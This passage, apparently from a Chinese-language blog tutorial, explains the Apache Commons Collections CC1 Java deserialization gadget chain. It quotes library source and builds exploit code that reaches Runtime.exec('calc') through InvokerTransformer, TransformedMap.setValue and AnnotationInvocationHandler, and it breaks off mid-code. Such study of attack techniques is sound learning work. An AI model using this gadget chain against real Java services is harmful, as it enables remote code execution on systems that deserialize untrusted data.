class="hljs-comment">     ** <span class="hljs-doctag">@param</span> object  the object to transform  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> the transformed object  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">protected</span> <span class="hljs-type">Object</span> <span class="hljs-title function_">transformKey</span><span class="hljs-params">(Object object)</span> &#123;  <br>        <span class="hljs-keyword">if</span> (keyTransformer == <span class="hljs-literal">null</span>) &#123;  <br>            <span class="hljs-keyword">return</span> object;  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> keyTransformer.transform(object);  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Transforms a value.     * &lt;p&gt;  </span><br><span class="hljs-comment">     * The transformer itself may throw an exception if necessary.  </span><br><span class="hljs-comment">     ** <span class="hljs-doctag">@param</span> object  the object to transform  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> the transformed object  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">protected</span> <span class="hljs-type">Object</span> <span class="hljs-title function_">transformValue</span><span class="hljs-params">(Object object)</span> &#123;  <br>        <span class="hljs-keyword">if</span> (valueTransformer == <span class="hljs-literal">null</span>) &#123;  <br>            <span class="hljs-keyword">return</span> object;  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> valueTransformer.transform(object);  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Transforms a map.     * &lt;p&gt;  </span><br><span class="hljs-comment">     * The transformer itself may throw an exception if necessary.  </span><br><span class="hljs-comment">     ** <span class="hljs-doctag">@param</span> map  the map to transform  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> the transformed object  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">protected</span> <span class="hljs-type">Map</span> <span class="hljs-title function_">transformMap</span><span class="hljs-params">(Map map)</span> &#123;  <br>        <span class="hljs-keyword">if</span> (map.isEmpty()) &#123;  <br>            <span class="hljs-keyword">return</span> map;  <br>        &#125;  <br>        <span class="hljs-type">Map</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedMap</span>(map.size());  <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">Iterator</span> <span class="hljs-variable">it</span> <span class="hljs-operator">=</span> map.entrySet().iterator(); it.hasNext(); ) &#123;  <br>            Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> (Map.Entry) it.next();  <br>            result.put(transformKey(entry.getKey()), transformValue(entry.getValue()));  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> result;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Override to transform the value when using &lt;code&gt;setValue&lt;/code&gt;.  </span><br><span class="hljs-comment">     ** <span class="hljs-doctag">@param</span> value  the value to transform  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the transformed value  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@since</span> Commons Collections 3.1  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">protected</span> <span class="hljs-type">Object</span> <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;  <br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Override to only return true when there is a value transformer.     ** <span class="hljs-doctag">@return</span> true if a value transformer is in use  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@since</span> Commons Collections 3.1  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSetValueChecking</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> (valueTransformer != <span class="hljs-literal">null</span>);  <br>    &#125;  <br>  <br>    <span class="hljs-comment">//-----------------------------------------------------------------------  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">Object</span> <span class="hljs-title function_">put</span><span class="hljs-params">(Object key, Object value)</span> &#123;  <br>        key = transformKey(key);  <br>        value = transformValue(value);  <br>        <span class="hljs-keyword">return</span> getMap().put(key, value);  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title function_">putAll</span><span class="hljs-params">(Map mapToCopy)</span> &#123;  <br>        mapToCopy = transformMap(mapToCopy);  <br>        getMap().putAll(mapToCopy);  <br>    &#125;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure></div>
+
+<p>我们稍微理解一下这段代码，这个类继承自AbstractInputCheckedMapDecorator，是可以被序列化的，这个类接收两个参数这两个参数都是Transformer<br>我们发现这个类的构造方法是protected的，但是提供了一个静态方法用来实例化对象<br>我们发现这个类里面的checkSetValue方法调用了Transformer这个方法，我们只要让这个value是Runtime就可以了，我们写个简单的exp试一试。</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Step1</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br><span class="hljs-comment">//        invokerTransformer.transform(runtime);  </span><br>        <span class="hljs-type">HashMap</span>&lt;Object, Object&gt; <span class="hljs-variable">objectObjectHashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> TransformedMap.decorate(objectObjectHashMap, <span class="hljs-literal">null</span>, invokerTransformer);  <br>        <span class="hljs-type">Class</span>&lt;? extends Map&gt; <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> decorate.getClass();  <br>        <span class="hljs-type">Method</span> <span class="hljs-variable">checkSetValue</span> <span class="hljs-operator">=</span> aClass.getDeclaredMethod(<span class="hljs-string">&quot;checkSetValue&quot;</span>,Object.class);  <br>        checkSetValue.setAccessible(<span class="hljs-literal">true</span>);  <br>        checkSetValue.invoke(decorate,runtime);    <br>  <br>  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure></div>
+<p>这段代码我绕了好久才明白，我们的目的是使用这个transformer，并且使用这个transformer的是一个invoke的transformer，这样的话才能自然而然的调用他那个类里重写的方法，我们找到的这段函数是valuetransformer去调用，那么我们就要让valuetransformer是invoketransformer，所以我们把这个对象的第三个参数设置成这个，value的参数自然是Runtime，这样就可以实现我们的命令了。<br>这一步我们总结出来的道理就是我们要找到谁使用了这个transformer方法，我们要保证使用这个方法的可以是invoketransformer，好像有点像废话，肯定只有transformer的参数才能用这个方法啊。我们接着往下找吧。</p>
+<p>我们只能创建对象或者集合，所以我们就要找谁使用了这个decorate这个方法，遗憾的是这条路是走不通的，这种情况意味着我们不能实例化这个对象了，因为decorate我们不能使用，所以我们就只能找还有哪个类调用了checkvalue这个方法。</p>
+<h2 id="AbstractInputCheckedMapDecorator-与-setValue"><a href="#AbstractInputCheckedMapDecorator-与-setValue" class="headerlink" title="AbstractInputCheckedMapDecorator 与 setValue"></a>AbstractInputCheckedMapDecorator 与 setValue</h2><p>我们发现只有一个调用了这个方法，就是AbstractInputCheckedMapDecorator类</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*  </span><br><span class="hljs-comment"> *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */</span><span class="hljs-keyword">package</span> org.apache.commons.collections.map;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Array;  <br><span class="hljs-keyword">import</span> java.util.Iterator;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br><span class="hljs-keyword">import</span> java.util.Set;  <br>  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.iterators.AbstractIteratorDecorator;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.AbstractMapEntryDecorator;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.set.AbstractSetDecorator;  <br>  <br><span class="hljs-comment">/**  </span><br><span class="hljs-comment"> * An abstract base class that simplifies the task of creating map decorators. * &lt;p&gt;  </span><br><span class="hljs-comment"> * The Map API is very difficult to decorate correctly, and involves implementing  </span><br><span class="hljs-comment"> * lots of different classes. This class exists to provide a simpler API. * &lt;p&gt;  </span><br><span class="hljs-comment"> * Special hook methods are provided that are called when objects are added to  </span><br><span class="hljs-comment"> * the map. By overriding these methods, the input can be validated or manipulated. * In addition to the main map methods, the entrySet is also affected, which is * the hardest part of writing map implementations. * &lt;p&gt;  </span><br><span class="hljs-comment"> * This class is package-scoped, and may be withdrawn or replaced in future  </span><br><span class="hljs-comment"> * versions of Commons Collections. * * <span class="hljs-doctag">@since</span> Commons Collections 3.1  </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $  </span><br><span class="hljs-comment"> ** <span class="hljs-doctag">@author</span> Stephen Colebourne  </span><br><span class="hljs-comment"> */</span><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractInputCheckedMapDecorator</span>  <br>        <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMapDecorator</span> &#123;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Constructor only used in deserialization, do not use otherwise.     */</span>    <span class="hljs-type">protected</span> <span class="hljs-title function_">AbstractInputCheckedMapDecorator</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-built_in">super</span>();  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Constructor that wraps (not copies).     ** <span class="hljs-doctag">@param</span> map  the map to decorate, must not be null  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if map is null  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-type">protected</span> <span class="hljs-title function_">AbstractInputCheckedMapDecorator</span><span class="hljs-params">(Map map)</span> &#123;  <br>        <span class="hljs-built_in">super</span>(map);  <br>    &#125;  <br>  <br>    <span class="hljs-comment">//-----------------------------------------------------------------------  </span><br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Hook method called when a value is being set using &lt;code&gt;setValue&lt;/code&gt;.  </span><br><span class="hljs-comment">     * &lt;p&gt;  </span><br><span class="hljs-comment">     * An implementation may validate the value and throw an exception  </span><br><span class="hljs-comment">     * or it may transform the value into another object.     * &lt;p&gt;  </span><br><span class="hljs-comment">     * This implementation returns the input value.  </span><br><span class="hljs-comment">     ** <span class="hljs-doctag">@param</span> value  the value to check  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> UnsupportedOperationException if the map may not be changed by setValue  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if the specified value is invalid  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> ClassCastException if the class of the specified value is invalid  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> NullPointerException if the specified value is null and nulls are invalid  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-type">Object</span> <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span>;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Hook method called to determine if &lt;code&gt;checkSetValue&lt;/code&gt; has any effect.  </span><br><span class="hljs-comment">     * &lt;p&gt;  </span><br><span class="hljs-comment">     * An implementation should return false if the &lt;code&gt;checkSetValue&lt;/code&gt; method  </span><br><span class="hljs-comment">     * has no effect as this optimises the implementation.     * &lt;p&gt;  </span><br><span class="hljs-comment">     * This implementation returns &lt;code&gt;true&lt;/code&gt;.  </span><br><span class="hljs-comment">     ** <span class="hljs-doctag">@return</span> true always  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSetValueChecking</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">//-----------------------------------------------------------------------  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">Set</span> <span class="hljs-title function_">entrySet</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">if</span> (isSetValueChecking()) &#123;  <br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EntrySet</span>(map.entrySet(), <span class="hljs-built_in">this</span>);  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            <span class="hljs-keyword">return</span> map.entrySet();  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">//-----------------------------------------------------------------------  </span><br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Implementation of an entry set that checks additions via setValue.     */</span>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EntrySet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractSetDecorator</span> &#123;  <br>          <br>        <span class="hljs-comment">/** The parent map */</span>  <br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AbstractInputCheckedMapDecorator parent;  <br>  <br>        <span class="hljs-type">protected</span> <span class="hljs-title function_">EntrySet</span><span class="hljs-params">(Set set, AbstractInputCheckedMapDecorator parent)</span> &#123;  <br>            <span class="hljs-built_in">super</span>(set);  <br>            <span class="hljs-built_in">this</span>.parent = parent;  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">public</span> <span class="hljs-type">Iterator</span> <span class="hljs-title function_">iterator</span><span class="hljs-params">()</span> &#123;  <br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EntrySetIterator</span>(collection.iterator(), parent);  <br>        &#125;  <br>          <br>        <span class="hljs-keyword">public</span> <span class="hljs-type">Object</span>[] <span class="hljs-title function_">toArray</span><span class="hljs-params">()</span> &#123;  <br>            <span class="hljs-type">Object</span>[] <span class="hljs-variable">array</span> <span class="hljs-operator">=</span> collection.toArray();  <br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; array.length; i++) &#123;  <br>                array[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MapEntry</span>((Map.Entry) array[i], parent);  <br>            &#125;  <br>            <span class="hljs-keyword">return</span> array;  <br>        &#125;  <br>          <br>        <span class="hljs-keyword">public</span> <span class="hljs-type">Object</span>[] <span class="hljs-title function_">toArray</span><span class="hljs-params">(Object array[])</span> &#123;  <br>            <span class="hljs-type">Object</span>[] <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> array;  <br>            <span class="hljs-keyword">if</span> (array.length &gt; <span class="hljs-number">0</span>) &#123;  <br>                <span class="hljs-comment">// we must create a new array to handle multi-threaded situations  </span><br>                <span class="hljs-comment">// where another thread could access data before we decorate it                result = (Object[]) Array.newInstance(array.getClass().getComponentType(), 0);  </span><br>            &#125;  <br>            result = collection.toArray(result);  <br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; result.length; i++) &#123;  <br>                result[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MapEntry</span>((Map.Entry) result[i], parent);  <br>            &#125;  <br>  <br>            <span class="hljs-comment">// check to see if result should be returned straight  </span><br>            <span class="hljs-keyword">if</span> (result.length &gt; array.length) &#123;  <br>                <span class="hljs-keyword">return</span> result;  <br>            &#125;  <br>  <br>            <span class="hljs-comment">// copy back into input array to fulfil the method contract  </span><br>            System.arraycopy(result, <span class="hljs-number">0</span>, array, <span class="hljs-number">0</span>, result.length);  <br>            <span class="hljs-keyword">if</span> (array.length &gt; result.length) &#123;  <br>                array[result.length] = <span class="hljs-literal">null</span>;  <br>            &#125;  <br>            <span class="hljs-keyword">return</span> array;  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Implementation of an entry set iterator that checks additions via setValue.     */</span>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EntrySetIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractIteratorDecorator</span> &#123;  <br>          <br>        <span class="hljs-comment">/** The parent map */</span>  <br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AbstractInputCheckedMapDecorator parent;  <br>          <br>        <span class="hljs-type">protected</span> <span class="hljs-title function_">EntrySetIterator</span><span class="hljs-params">(Iterator iterator, AbstractInputCheckedMapDecorator parent)</span> &#123;  <br>            <span class="hljs-built_in">super</span>(iterator);  <br>            <span class="hljs-built_in">this</span>.parent = parent;  <br>        &#125;  <br>          <br>        <span class="hljs-keyword">public</span> <span class="hljs-type">Object</span> <span class="hljs-title function_">next</span><span class="hljs-params">()</span> &#123;  <br>            Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> (Map.Entry) iterator.next();  <br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MapEntry</span>(entry, parent);  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Implementation of a map entry that checks additions via setValue.     */</span>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapEntry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMapEntryDecorator</span> &#123;  <br>  <br>        <span class="hljs-comment">/** The parent map */</span>  <br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AbstractInputCheckedMapDecorator parent;  <br>  <br>        <span class="hljs-type">protected</span> <span class="hljs-title function_">MapEntry</span><span class="hljs-params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;  <br>            <span class="hljs-built_in">super</span>(entry);  <br>            <span class="hljs-built_in">this</span>.parent = parent;  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">public</span> <span class="hljs-type">Object</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> &#123;  <br>            value = parent.checkSetValue(value);  <br>            <span class="hljs-keyword">return</span> entry.setValue(value);  <br>        &#125;  <br>    &#125;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure></div>
+<p>这段代码很长，我们看到这是一个抽象类是不能实例化的，同时还没有public是不能直接访问的。很显然是他的子类在调用setvalue的时候会调用checksetvalue这个方法，所以接下来我们验证一下执行这个setvalue会不会触发调用。</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">protected</span> <span class="hljs-title function_">MapEntry</span><span class="hljs-params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;  <br>    <span class="hljs-built_in">super</span>(entry);  <br>    <span class="hljs-built_in">this</span>.parent = parent;  <br>&#125;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-type">Object</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> &#123;  <br>    value = parent.checkSetValue(value);  <br>    <span class="hljs-keyword">return</span> entry.setValue(value);  <br>&#125;<br></code></pre></td></tr></table></figure></div>
+<p>我们不难发现，这里需要的对象是Map.Entry，我们新建的map是不能直接调用这个方法的，所以我们需要先进行一个遍历取出这个entry之后再能进行调用</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Step1</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br><span class="hljs-comment">//        invokerTransformer.transform(runtime);  </span><br>        <span class="hljs-type">HashMap</span>&lt;Object, Object&gt; <span class="hljs-variable">objectObjectHashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>        objectObjectHashMap.put(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>);  <br>        <span class="hljs-type">Map</span>&lt;Object,Object&gt; <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> TransformedMap.decorate(objectObjectHashMap, <span class="hljs-literal">null</span>, invokerTransformer);  <br><span class="hljs-comment">//        Class&lt;? extends Map&gt; aClass = decorate.getClass();  </span><br><span class="hljs-comment">//        Method checkSetValue = aClass.getDeclaredMethod(&quot;checkSetValue&quot;,Object.class);  </span><br><span class="hljs-comment">//        checkSetValue.setAccessible(true);  </span><br><span class="hljs-comment">//        checkSetValue.invoke(decorate,runtime);  </span><br>        <span class="hljs-keyword">for</span> (Map.Entry entry : decorate.entrySet())&#123;  <br>            entry.setValue(runtime);  <br>  <br>        &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure></div>
+
+<h2 id="进入-AnnotationInvocationHandler"><a href="#进入-AnnotationInvocationHandler" class="headerlink" title="进入 AnnotationInvocationHandler"></a>进入 AnnotationInvocationHandler</h2><p>我们发现成功弹计算器，证明是可以正常调用的，接下来我们的目标就是谁调用了这个setvalue我们发现AnnotationInvocationHandler这个类的readobject调用了这个，那我们只要实例化这个类的对象然后再进行反序列化就完成目标了，终于要走到尽头了吗。<br>接下来我们先把完整的exp写出来然后再进行修正。<br> AnnotationInvocationHandler这个类的代码非常长我就不贴出来了<br>这个类继承自InvocationHandler，可以被序列化，有两个参数一个是type也就是注解，另一个就是map。</p>
+<p>这个类是deafult的，也只能通过反射进行获取我们先本写exp吧</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Step1</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span 